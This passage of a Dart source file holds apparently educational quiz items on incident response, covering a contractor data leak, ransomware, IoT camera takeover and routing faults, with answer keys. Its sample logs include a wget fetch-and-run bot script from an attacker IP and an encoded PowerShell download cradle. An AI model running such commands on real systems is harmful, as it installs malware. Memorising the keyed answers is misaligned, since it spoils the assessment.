  // ━━ s_real_012: LINEサーバ委託先からの情報漏洩（52万件） ━━━━━━━━━━━━━━

  Question(
    id: 'q_real_012_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_012',
    prompt: '以下はLINEのサービス委託先サーバのアクセスログ・セキュリティイベントです。何が起きているか選んでください。',
    logLines: [
      'Oct 26 11:03:52 OVERSEAS-SV %SEC-3-BRUTEFORCE: 847 failed logins in 60s',
      '  target_account=db_user01, src=203.0.113.0/24',
      'Oct 26 11:04:41 OVERSEAS-SV %SEC-3-AUTHOK: Login succeeded after failures',
      '  account=db_user01, src=203.0.113.77',
      'Oct 26 11:05:02 OVERSEAS-SV %DB-4-BULK_EXPORT: Large query detected',
      '  query: SELECT * FROM user_info LIMIT 520000, rows=520000',
      'Oct 26 11:05:58 OVERSEAS-SV %NET-3-UPLOAD: Outbound large transfer',
      '  dst=45.77.88.102:443, size=1.8GB, duration=56s',
    ],
    choices: [
      Choice(
        id: 'a', text: '正規の海外スタッフがユーザーデータを定期レポート用にエクスポートしている',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '847回のブルートフォース失敗後のログイン成功と、1.8GBの外部転送は通常業務ではありません。攻撃者がブルートフォースでアカウントを突破した痕跡です。',
      ),
      Choice(
        id: 'b', text: 'ブルートフォースでDBアカウントを突破し、52万件のユーザー情報が外部に送信された',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 847回の失敗後にログイン成功 → 52万件のSELECT → 1.8GBの外部転送という一連の流れは、情報窃取攻撃の典型的なパターンです。',
      ),
      Choice(
        id: 'c', text: 'DDos攻撃によりサーバが過負荷状態になっている',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'DDoSなら大量のリクエストによるCPU・帯域の枯渇ログが出ます。このログはブルートフォース後の認証成功とデータ持ち出しを示しています。',
      ),
      Choice(
        id: 'd', text: 'バックアップジョブがスケジュールより早く起動してデータを転送している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'バックアップなら事前に失敗ログは出ません。847回の認証失敗→成功の流れはブルートフォース攻撃の明確な証拠です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '委託先の海外関連会社サーバのDBアカウント（db_user01）がブルートフォース攻撃で突破された。'
          '攻撃者はSELECT *で52万件のユーザー情報を一括取得し、外部サーバ（45.77.88.102）へ1.8GBを転送した。'
          '委託先のアカウントロックアウトポリシー不備が侵害を許した。',
      nextActions: [
        '侵害されたdb_user01アカウントを即時無効化する',
        '外部転送先IP（45.77.88.102）をファイアウォールでブロック',
        '漏洩データの内容（氏名・電話番号・トークン等）を特定する',
        '個人情報保護委員会への報告と影響ユーザーへの通知を準備',
        'DBアクセスに多要素認証（MFA）とアカウントロックポリシーを実装する',
      ],
      relatedCommands: [
        'mysql -e "SHOW PROCESSLIST;"  （現在の接続確認）',
        'grep "db_user01" /var/log/mysql/mysql-slow.log',
        'iptables -I OUTPUT -d 45.77.88.102 -j DROP',
      ],
      studyReference: '個人情報保護法第26条（漏洩報告）/ IPA「クラウドサービス委託先管理ガイドライン」',
    ),
  ),

  Question(
    id: 'q_real_012_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_012',
    prompt:
        '委託先の海外サーバから52万件のユーザー情報が漏洩したことが判明した。\n'
        'サービス運営会社として、法的・倫理的に最優先で行うべき対応はどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: '漏洩範囲を特定したうえで、個人情報保護委員会と影響ユーザーへの通知を速やかに行う',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 改正個人情報保護法では1,000件以上の漏洩は委員会への報告が義務です。また影響ユーザーへの通知はサービス事業者の責務です。速やかな対応が信頼回復につながります。',
      ),
      Choice(
        id: 'b', text: '委託先の責任であるため、委託先からの報告を待って自社は対応しない',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '委託元は委託先の管理責任を負います。個人情報保護法では委託元が報告義務を負っています。委託先任せは法的義務不履行になります。',
      ),
      Choice(
        id: 'c', text: '漏洩した情報を取り戻すために攻撃者と直接交渉する',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '攻撃者との交渉は法的に問題があり、情報の削除保証もありません。適切な機関（警察・JPCERT/CC）に報告し、法的手続きを踏むべきです。',
      ),
      Choice(
        id: 'd', text: '社内調査を完了させてから外部に公表する（数週間後）',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '詳細調査前でも速報として当局への報告と影響ユーザーへの通知が必要です。数週間の公表遅延は二次被害（フィッシング等）のリスクを高め、法的にも問題になる可能性があります。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '改正個人情報保護法（2022年4月施行）により、1,000件以上の個人情報漏洩または要配慮個人情報漏洩は'
          '個人情報保護委員会への報告が義務化（発覚後速やかに速報、30日以内に確報）。'
          '委託元も委託先の管理責任を負う。影響ユーザーには二次被害（フィッシング等）への注意喚起が必要。',
      nextActions: [
        '漏洩件数・内容（氏名・電話番号・メール等）を速やかに特定する',
        '個人情報保護委員会に速報（発覚後3〜5日を目安）を提出する',
        '影響ユーザーに漏洩内容・二次被害リスク・問い合わせ窓口を通知する',
        '委託先のセキュリティ体制（MFA・ロックアウトポリシー）を是正させる',
        '自社の委託先管理規程を見直しセキュリティ要件を強化する',
      ],
      relatedCommands: [
        '個人情報保護委員会オンライン報告フォーム（ppc.go.jp）を使用',
      ],
      studyReference: '個人情報保護法第26条・第24条（委託先管理）/ IPA「情報漏えい対応の手引き」',
    ),
  ),

  // ━━ s_real_013: 業務委託先ランサムウェア→複数金融機関への連鎖漏洩 ━━━━━━━━━

  Question(
    id: 'q_real_013_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_013',
    prompt: '以下は印刷会社（委託先）のセキュリティログです。何が発生しているか選んでください。',
    logLines: [
      'Feb 08 00:31:15 PRINT-SV01 %EMAIL-4-MALWARE: Macro-enabled attachment opened',
      '  From: supplier-noreply@invoice-jp.net, Attach: 請求書_2024.xlsm',
      'Feb 08 00:31:44 PRINT-SV01 %PROC-3-SUSPICIOUS: PowerShell download cradle detected',
      '  cmd: powershell -enc JABjAGwAaQBlAG4AdA...',
      '  Connecting to: 45.153.240.18:8080',
      'Feb 08 00:32:01 PRINT-SV01 %CRYPTO-3-RANSOMWARE: Encryption process started',
      '  Target: C:\\PrintJobs\\*  Files: 4521  (銀行A顧客通知書, 保険B契約書, etc.)',
      'Feb 08 00:32:14 PRINT-SV01 %FS-3-SHADOW_DEL: Shadow copies deleted',
    ],
    choices: [
      Choice(
        id: 'a', text: '印刷会社がフィッシングメールのマクロ実行でランサムウェアに感染し、複数金融機関の印刷物データが暗号化された',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 不正マクロ実行→PowerShellダウンローダー→ランサムウェア展開という典型的な感染チェーン。印刷中の銀行・保険会社の顧客データも暗号化され、漏洩リスクが生じています。',
      ),
      Choice(
        id: 'b', text: '印刷会社の社員が誤って機密データをクラウドにアップロードした',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'クラウドアップロードなら%NET-4-UPLOAD系のログが出ます。PowerShellのダウンロードクレードルとランサムウェアプロセスは外部攻撃による感染を示しています。',
      ),
      Choice(
        id: 'c', text: 'プリンタのファームウェア更新中にシステムがクラッシュした',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ファームウェア更新なら%SYS-3-UPGRADE系ログが出ます。マクロ実行→PowerShell→暗号化という一連の流れはランサムウェアの感染シーケンスです。',
      ),
      Choice(
        id: 'd', text: '印刷ジョブのスプーラーがファイルシステムエラーでクラッシュした',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'スプーラーエラーなら%PRINT-3-SPOOLSV_ERRORのログが出ます。%CRYPTO-3-RANSOMWAREとVSS削除は明確にランサムウェアを示しています。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '印刷会社がフィッシングメール（偽請求書）のExcelマクロを実行。'
          'PowerShellダウンローダーでC2からランサムウェアをロードし、印刷待ちデータを暗号化。'
          '印刷物には複数の銀行・保険会社の顧客情報（氏名・住所・口座番号等）が含まれており、'
          'サプライチェーン経由で複数金融機関の顧客データが漏洩した。',
      nextActions: [
        '感染確認後、直ちに印刷会社から委託元の全金融機関に連絡する',
        '印刷中だったデータの種別と件数を印刷会社から取得する',
        '各金融機関は個人情報保護委員会への報告義務を確認し速報を提出する',
        '影響顧客への通知と口座不正利用監視を強化する',
        '印刷委託契約にISMS・セキュリティ要件を追加する',
      ],
      relatedCommands: [
        'Get-WinEvent -LogName Security -Id 4688 | Where {\$_.Message -match "powershell"}',
        'strings C:\\PrintJobs\\*.xlsm | grep -i "powershell\\|http\\|base64"',
      ],
      studyReference: 'IPA「委託先のセキュリティ対策確認のためのガイドライン」/ JPCERT/CC「マクロウイルス感染事例」',
    ),
  ),

  Question(
    id: 'q_real_013_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_013',
    prompt:
        '委託先の印刷会社がランサムウェアに感染し、自社顧客の印刷データ（氏名・住所・口座番号等）が漏洩した可能性がある。\n'
        '金融機関のセキュリティ担当として、最初に行うべきことはどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: '漏洩した顧客の口座に不正利用監視（フラグ設定）をかけ、顧客への通知準備を開始する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 口座番号が漏洩した場合、不正振替や詐欺被害が発生する前に監視強化と顧客通知の準備が最優先です。二次被害防止が顧客保護の観点で重要です。',
      ),
      Choice(
        id: 'b', text: '印刷委託をすべて中止し、別会社を探してから対応を検討する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '委託先変更は中長期の対策です。現在発生している顧客情報漏洩への対応（監視・通知）が先決です。委託先変更に時間をかけている間に二次被害が起きる可能性があります。',
      ),
      Choice(
        id: 'c', text: '印刷会社が復旧するまで自社は何もせず待機する',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '委託先の復旧を待つ間も顧客の口座情報は漏洩したままです。金融機関には顧客保護義務があり、受動的な待機は不適切です。',
      ),
      Choice(
        id: 'd', text: '事実関係が明確になるまで顧客への通知は控える',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '通知を遅らせると顧客が二次被害に遭うリスクが高まります。不確実な状況でも「調査中」として速報を通知することが顧客保護の観点で重要です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '金融機関の顧客情報（口座番号・住所等）が漏洩した場合、攻撃者は口座乗っ取り・振込詐欺に悪用する可能性がある。'
          '対応優先順位: ①漏洩顧客の口座に不正利用監視フラグ → ②顧客への速報通知 → '
          '③個人情報保護委員会・金融庁への報告 → ④印刷会社への再発防止要求。',
      nextActions: [
        '漏洩対象の顧客リストを特定し、全口座に不正利用監視を設定',
        '顧客に漏洩の事実・注意事項・問い合わせ窓口を通知（SMS・郵便等）',
        '個人情報保護委員会と金融庁への報告書を準備・提出',
        '印刷委託契約にセキュリティ監査要件を追加し、次回から委託前にISMS認証を確認',
        '類似委託先（他の印刷・発送会社）のセキュリティ水準も確認する',
      ],
      relatedCommands: [
        'UPDATE accounts SET monitoring_flag=1 WHERE customer_id IN (...);  （口座監視）',
      ],
      studyReference: 'IPA「金融機関向け情報漏洩対応ガイドライン」/ 個人情報保護法第26条（漏洩報告義務）',
    ),
  ),

  // ━━ s_l3_001: デフォルトルート消失 / 問3（暫定復旧） ━━━━━━━━━━━━━━━━━━

  Question(
    id: 'q_l3_001_3',
    type: QuestionType.decisionFlow,
    scenarioId: 's_l3_001',
    prompt:
        'ISP側リンクダウン・デフォルトルート消失が確認された。\n'
        '業務影響を最小化する暫定復旧策として最も適切なものはどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: 'HQ経由の迂回ルートをスタティックルートで手動設定して暫定復旧する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ ISPが復旧するまでの間、HQ経由でインターネットに出る迂回ルートを手動スタティックで設定するのが最短の暫定復旧手順です。',
      ),
      Choice(
        id: 'b', text: 'ISPに電話して復旧を待つ（自社側では何もしない）',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ISPへの連絡は必要ですが、迂回経路が取れる構成なら自社側で暫定対処できます。待機中の業務停止時間を短縮するため、自社でできる対応を先に行います。',
      ),
      Choice(
        id: 'c', text: '全社員にインターネット利用停止を通知して復旧を待つ',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'HQ経由の迂回が可能なら業務継続できます。全利用停止は最後の手段です。まず技術的な迂回対応を試みます。',
      ),
      Choice(
        id: 'd', text: 'WAN側インターフェースを一度シャットダウンして再起動する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'リンクダウンはISP側の障害によるものです。インターフェースの再起動はISP側が復旧していなければ効果がなく、接続が戻らない可能性があります。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'ISP側リンクダウンでデフォルトルートが消えたときの暫定対応: '
          'HQ（本社）経由のVPNやWAN回線がある場合、スタティックルートで0.0.0.0/0をHQ向けに設定することで'
          'インターネット通信を迂回させられる。ISPが復旧したらスタティックルートを削除してBGP経路に戻す。',
      nextActions: [
        'ip route 0.0.0.0 0.0.0.0 [HQのネクストホップIP] でデフォルトルートを手動設定',
        'ping 8.8.8.8 で疎通確認',
        'ISPにリンク障害の報告と復旧時刻の確認を入れる',
        'ISP復旧後: no ip route 0.0.0.0 0.0.0.0 でスタティックルートを削除',
        '恒久対応: BGP設定確認・バックアップ回線の導入検討',
      ],
      relatedCommands: [
        'ip route 0.0.0.0 0.0.0.0 10.0.0.1  （HQ経由スタティックルート）',
        'show ip route 0.0.0.0',
        'ping 8.8.8.8 source [拠点のLAN-IF]',
        'no ip route 0.0.0.0 0.0.0.0 10.0.0.1  （ISP復旧後に削除）',
      ],
      studyReference: 'CCNA: スタティックルート・BGPフォールバック・冗長構成の基礎',
    ),
  ),

  // ━━ s_l3_002: OSPFネイバー確立しない / 問2（修正手順） ━━━━━━━━━━━━━━━━

  Question(
    id: 'q_l3_002_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_l3_002',
    prompt:
        'OSPFのDead Intervalの不一致（Router-B: 40sec、隣接: 20sec）が原因と判明した。\n'
        '正しい修正手順はどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: 'Router-BのDead Intervalを隣接ルーターに合わせて20秒に変更する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 既存ルーターの設定を変更すると他のOSPFネイバーに影響が出る場合があるため、新規追加したRouter-BのDead Intervalを既存の20秒（Hello: 5秒）に合わせるのが原則です。',
      ),
      Choice(
        id: 'b', text: '隣接ルーターのDead Intervalを40秒に変更する',
        isCorrect: false, scoreImpact: 50,
        feedbackText: '技術的には可能ですが、既存ルーターの設定変更は他のOSPFネイバー関係にも影響します。新規追加のRouter-Bの設定を合わせる方が影響範囲が小さくなります。',
      ),
      Choice(
        id: 'c', text: 'OSPFプロセスを再起動してネイバーを再確立する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'Dead Intervalの値が不一致のままでは再起動しても同じ問題が発生します。パラメータを一致させてからプロセスを再起動する必要があります。',
      ),
      Choice(
        id: 'd', text: 'OSPFを無効にしてスタティックルートに切り替える',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'Dead Intervalの不一致という単純な設定ミスでOSPFを廃止するのは過剰対応です。パラメータを正しく設定すれば解決します。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'OSPFのHello/Dead Intervalはインターフェースごとに設定する。'
          '新規ルーターのデフォルト設定がネットワーク標準と異なる場合は、新規側を合わせるのが原則。'
          '修正後にshow ip ospf neighborでFULLステートになることを確認する。',
      nextActions: [
        'Router-BのDead Intervalを20秒（Hello: 5秒）に変更する',
        'show ip ospf neighbor でFULLステートを確認する',
        '設定を running-config に保存する（write memory / copy run start）',
        '変更前後のルーティングテーブルを比較して経路が正しく学習できているか確認する',
      ],
      relatedCommands: [
        'interface GigabitEthernet0/0',
        ' ip ospf dead-interval 20',
        ' ip ospf hello-interval 5',
        'show ip ospf neighbor',
        'show ip ospf interface GigabitEthernet0/0',
      ],
      studyReference: 'CCNA: OSPFネイバー確立・Hello/Dead Intervalの設定',
    ),
  ),

  // ━━ s_cap_001: 帯域逼迫 / 問2（QoS対策） ━━━━━━━━━━━━━━━━━━━━━━━━━━

  Question(
    id: 'q_cap_001_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_cap_001',
    prompt:
        '192.168.10.50がRTMP（ポート1935）で52Mbpsを独占していることが判明した。\n'
        '業務トラフィックを守るための対処として最も適切なものはどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: 'QoSポリシーでRTMPトラフィックを帯域制限し、業務HTTPSを優先キューに設定する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ RTMPの帯域を制限（ポリシング）しつつ、業務トラフィック（HTTPS等）を優先キューに入れることで帯域を公平に使い、業務影響を最小化できます。',
      ),
      Choice(
        id: 'b', text: '192.168.10.50のPCをネットワークから切断する',
        isCorrect: false, scoreImpact: 50,
        feedbackText: '即効性はありますが、業務上の正当な動画配信の可能性もあります。まずユーザーに確認し、QoSで帯域制限する方が適切な対処です。',
      ),
      Choice(
        id: 'c', text: 'WAN回線を100Mbpsから1Gbpsに増速する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '増速は有効な恒久対策ですが、今すぐ実施できる対応ではありません。まずQoSで帯域を適切に分配してから、中長期的に増速を検討します。',
      ),
      Choice(
        id: 'd', text: '全社員にRTMP通信の利用を禁止する通達を出す',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '通達は有効ですが、技術的制御なしでは守られない可能性があります。QoSによる自動制御と組み合わせることで実効性が上がります。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'QoS（Quality of Service）による帯域制御: '
          'NBAR（Network Based Application Recognition）でRTMP等のアプリケーションを識別し、'
          'ポリシーマップで帯域上限を設定する（例: RTMPは最大20Mbps）。'
          '業務トラフィック（HTTPS: 443）を優先キュー（LLQ）に設定して遅延を最小化する。',
      nextActions: [
        'ip nbar protocol-discovery でアプリケーション別帯域を継続監視する',
        'class-map でRTMPと業務HTTPSを分類する',
        'policy-map でRTMPに帯域制限（police rate 20m）、HTTPSを優先キューに設定',
        '192.168.10.50のユーザーに業務上の動画配信か確認する',
        '中長期: WAN回線増速かSD-WAN導入を検討する',
      ],
      relatedCommands: [
        'class-map match-any STREAMING',
        ' match protocol rtmp',
        'class-map match-any BUSINESS',
        ' match protocol https',
        'policy-map WAN-QOS',
        ' class STREAMING',
        '  police rate 20m',
        ' class BUSINESS',
        '  priority percent 40',
        'interface GigabitEthernet0/0',
        ' service-policy output WAN-QOS',
      ],
      studyReference: 'CCNP ENCOR: QoS・NBAR・ポリシングとシェーピングの違い',
    ),
  ),

  // ━━ s_real_014: ネットワーク接続IoT機器の脆弱性悪用 ━━━━━━━━━━━━━━━━━━

  Question(
    id: 'q_real_014_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_014',
    prompt: '以下はファイアウォールとIoTカメラのアクセスログです。何が起きているか選んでください。',
    logLines: [
      'Mar 15 02:11:03 FW01 %SEC-4-SCAN: Port scan detected',
      '  src=185.220.101.44, dst=10.10.0.0/24, ports=23,80,554,8080,8888',
      'Mar 15 02:11:47 CAM-SV01 %AUTH-3-LOGIN: Login from external IP',
      '  ip=185.220.101.44, account=admin, password=admin  (DEFAULT CRED)',
      'Mar 15 02:12:01 CAM-SV01 %RTSP-4-STREAM: Live stream accessed',
      '  src=185.220.101.44, camera=entrance-cam01, resolution=1080p',
      'Mar 15 02:12:33 CAM-SV01 %PROC-3-EXEC: Unusual command executed',
      '  cmd: wget http://185.220.101.44/bot.sh -O /tmp/bot.sh && sh /tmp/bot.sh',
    ],
    choices: [
      Choice(
        id: 'a', text: 'デフォルト認証情報のままのIPカメラに外部から不正アクセスし、映像閲覧とマルウェア実行がされた',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ ポートスキャン後にデフォルト認証（admin/admin）でログインし、映像を盗み見た上でbotスクリプトを実行。IoT機器のデフォルト認証情報放置による典型的な被害です。',
      ),
      Choice(
        id: 'b', text: 'カメラのファームウェア自動更新が失敗してシステムがクラッシュした',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ファームウェア更新なら%FW-3-UPDATE系ログが出ます。外部IPからのデフォルト認証でのログインとコマンド実行は攻撃の明確な証拠です。',
      ),
      Choice(
        id: 'c', text: '正規の監視サービス会社がリモートメンテナンスを実施している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '正規メンテナンスならあらかじめ登録されたIPと専用アカウントを使用します。デフォルト認証（admin/admin）と外部からのbotスクリプト実行は攻撃の特徴です。',
      ),
      Choice(
        id: 'd', text: 'ネットワーク障害でカメラが誤ったIPアドレスに接続している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ネットワーク障害なら通信断が発生しますが、ここでは外部IPからの認証成功とコマンド実行が記録されています。意図的な不正アクセスです。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '攻撃者はIPカメラがデフォルト認証情報（admin/admin）のままであることをスキャンで検出。'
          '外部からログインして映像を盗み見た後、マルウェア（botスクリプト）をインストール。'
          'IoT機器はPCと異なりEDRが導入されておらず、侵害されても気づきにくいため踏み台や監視ツールに悪用される。',
      nextActions: [
        'カメラの管理画面へのアクセスをファイアウォールで内部ネットワークに限定する',
        '全IoT機器のパスワードをデフォルトから強力なものに変更する',
        'カメラのファームウェアを最新版に更新し、既知の脆弱性を修正する',
        '侵害されたカメラをリセットしてbot.shの痕跡を削除する',
        'ネットワークセグメントを分離してIoT機器を業務ネットワークから切り離す',
      ],
      relatedCommands: [
        'iptables -I FORWARD -d 10.10.0.50 -j DROP  （カメラ外部通信遮断）',
        'nmap -sV --script=default 10.10.0.0/24  （IoT機器スキャン）',
        'ps aux | grep bot  （マルウェアプロセス確認）',
      ],
      studyReference: 'IPA「IoT機器のセキュリティ対策ガイド」/ Mirai Botnet事例 / CVE-2023-IoT系脆弱性',
    ),
  ),

  Question(
    id: 'q_real_014_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_014',
    prompt:
        '社内のIPカメラにデフォルト認証情報のまま外部から不正アクセスされ、映像が盗み見られていたことが判明した。\n'
        'まず行うべき対応はどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: 'カメラをネットワークから切り離し、全IoT機器のパスワードを変更する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 侵害されたカメラを即時切り離して被害を止め、同様の脆弱性がある他のIoT機器も点検・パスワード変更します。IoT機器の一括棚卸しと強化が重要です。',
      ),
      Choice(
        id: 'b', text: 'カメラのメーカーに問い合わせて対応を待つ',
        isCorrect: false, scoreImpact: -50,
        feedbackText: 'メーカーへの問い合わせは必要ですが、まず侵害されたカメラをネットワークから切り離して被害拡大を防ぐことが先決です。',
      ),
      Choice(
        id: 'c', text: '映像が盗み見られただけなので、パスワードを変更してそのまま使用を続ける',
        isCorrect: false, scoreImpact: -50,
        feedbackText: 'パスワード変更は必要ですが、カメラにbotスクリプトがインストールされている可能性があります。完全リセット・ファームウェア再インストールが必要です。',
      ),
      Choice(
        id: 'd', text: 'カメラの録画データを確認してから対応を決める',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '録画確認も必要ですが、まず侵害されたカメラを切り離してマルウェアの活動を止めることが優先です。その後に調査を行います。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'IoT機器のセキュリティは「デバイスの棚卸し」「デフォルト認証情報の変更」「ファームウェア更新」「ネットワーク分離」の4点が基本。'
          'IoT機器はセグメント分離（VLAN等）で業務ネットワークと切り離すことで、侵害時の被害範囲を限定できる。',
      nextActions: [
        '侵害カメラをLANケーブル切断・PoEポート無効化でネットワークから切り離す',
        '全IoT機器リストを作成してデフォルト認証のものを洗い出す',
        '各機器のパスワードを一意の強力なものに変更する',
        '侵害カメラはファームウェア再インストール後にパスワード設定してから再接続',
        'IoT機器専用VLANを作成し、インターネット直接通信を禁止する',
      ],
      relatedCommands: [
        'nmap -p 23,80,554,8080,8888 10.10.0.0/24  （IoT機器ポートスキャン）',
        'show vlan brief  （VLANセグメント確認）',
      ],
      studyReference: 'IPA「中小企業のためのIoTセキュリティ」/ NIST SP 800-213 (IoT Device Cybersecurity)',
    ),
  ),

  // ━━ s_real_016: 二重恐喝：データ暗号化＋ダークウェブ公開脅迫 ━━━━━━━━━━━━━

  Question(
    id: 'q_real_016_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_016',
    prompt: '以下はランサムウェア感染後に攻撃者から届いたメッセージと社内ログです。状況を正しく説明しているものはどれですか？',
    logLines: [
      'Jun 18 04:22:01 FILESVR01 %CRYPTO-3-RANSOMWARE: Mass encryption started',
      '  Encrypted: 44821 files, ransom note: README_LOCKED.txt',
      'Jun 18 04:22:30 FILESVR01 %NET-4-UPLOAD: Large outbound transfer before encryption',
      '  dst=185.220.101.55:443, size=28.4GB, duration=12min (detected retroactively)',
      '--- README_LOCKED.txt ---',
      'Your files are encrypted. Pay 50 BTC in 72 hours.',
      'ALSO: We have exfiltrated 28.4GB of your confidential data.',
      'If you do not pay, we will publish on: http://darkweb-leak.onion/yourcompany',
    ],
    choices: [
      Choice(
        id: 'a', text: 'ファイルを暗号化しただけで、データの外部流出は脅しであり実際には発生していない',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ログに暗号化前の28.4GBの外部転送が記録されています。データ流出は実際に発生しており、脅しだけではありません。',
      ),
      Choice(
        id: 'b', text: 'ファイル暗号化に加えて28.4GBのデータが事前に外部に持ち出され、支払いを要求する二重恐喝が行われている',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 暗号化前に28.4GBを外部転送（データ窃取）し、その後暗号化。「払わないとダークウェブで公開する」という二重恐喝（Double Extortion）の典型的な手口です。',
      ),
      Choice(
        id: 'c', text: 'バックアップサーバへの定期レプリケーションが偶然に外部IPに向かった',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'レプリケーションなら事前に設定されたIPに定期的に送信されます。暗号化の直前に攻撃者のIPに28.4GBを送信したのは意図的なデータ窃取です。',
      ),
      Choice(
        id: 'd', text: 'DDoS攻撃と同時にランサムウェアが配布された',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'DDoSならインバウンドの大量トラフィックが記録されます。このログはアウトバウンドのデータ転送（exfiltration）と暗号化を示しており、二重恐喝攻撃です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '二重恐喝（Double Extortion）：ランサムウェア攻撃で暗号化する前にデータを窃取し、'
          '「復号キーを売る」に加えて「支払わなければ盗んだデータをダークウェブで公開する」と脅迫する手法。'
          'バックアップで復旧できても情報漏洩の問題が残るため、被害者が支払いに応じやすくなる。',
      nextActions: [
        '感染端末を即時ネットワーク遮断して暗号化の拡大を防ぐ',
        'ログから流出したデータの種別と件数を特定する',
        '個人情報・機密情報の流出があれば個人情報保護委員会に報告する',
        '警察庁サイバー部門に相談（身代金支払いの可否含む）',
        'ダークウェブ監視サービスでリーク状況を確認する',
      ],
      relatedCommands: [
        'netstat -ano | findstr ESTABLISHED  （流出時の通信先確認）',
        'Get-WinEvent -LogName Security -Id 4663 | Where {\$_.TimeCreated -gt "2024-06-18 04:00"}',
      ],
      studyReference: 'IPA「ランサムウェア被害報告」/ JPCERT/CC「二重恐喝型ランサムウェアの動向」2023',
    ),
  ),

  Question(
    id: 'q_real_016_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_016',
    prompt:
        'ランサムウェアで28.4GBのデータが窃取・暗号化され、「72時間以内に支払わなければダークウェブで公開する」と脅迫された。\n'
        'この状況で最優先で行うべきことはどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: '流出データの内容（個人情報・機密情報）を特定し、当局への報告と顧客通知の準備を開始する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 二重恐喝では身代金支払いに関係なくデータが公開されるリスクがあります。流出内容を把握して法的義務（個人情報報告）を果たし、顧客への二次被害防止が最優先です。',
      ),
      Choice(
        id: 'b', text: '72時間以内に身代金を支払って復号キーとデータ削除を確約させる',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '身代金を支払っても復号保証はなく、データ削除の確約も守られない場合が多いです。支払いは攻撃者への資金供与にもなります。警察に相談してから判断します。',
      ),
      Choice(
        id: 'c', text: 'バックアップから復元してデータ漏洩を無視する',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '二重恐喝では復旧しても盗まれたデータが公開されます。個人情報が含まれる場合は法的報告義務があり、漏洩を無視することは法的問題になります。',
      ),
      Choice(
        id: 'd', text: 'まず社内でデータ復旧を試みてから外部に報告する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '復旧作業と当局報告は並行して行うべきです。個人情報保護法では発覚後速やかな報告が義務化されており、復旧を待ってから報告するのでは遅すぎます。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '二重恐喝への対応: '
          '①感染拡大防止（ネットワーク遮断） → ②流出データ内容の特定 → ③法的報告義務の確認・報告 → '
          '④顧客への通知 → ⑤バックアップからの復旧 → ⑥再発防止策。'
          '身代金支払いは警察に相談してから判断。支払っても公開を防げる保証はない。',
      nextActions: [
        '28.4GBの転送ログを解析してどのファイルが流出したか特定する',
        '個人情報が含まれる場合: 個人情報保護委員会への速報を準備',
        '警察庁サイバー局に相談（身代金支払いの判断も含む）',
        'オフラインバックアップから復旧環境を構築する',
        'ダークウェブ監視ツールで公開状況を継続監視する',
      ],
      relatedCommands: [
        'strings README_LOCKED.txt  （脅迫文の詳細確認）',
        'Get-ChildItem -Path E:\\ -Recurse | Where {\$_.LastWriteTime -gt "2024-06-18 04:20"}',
      ],
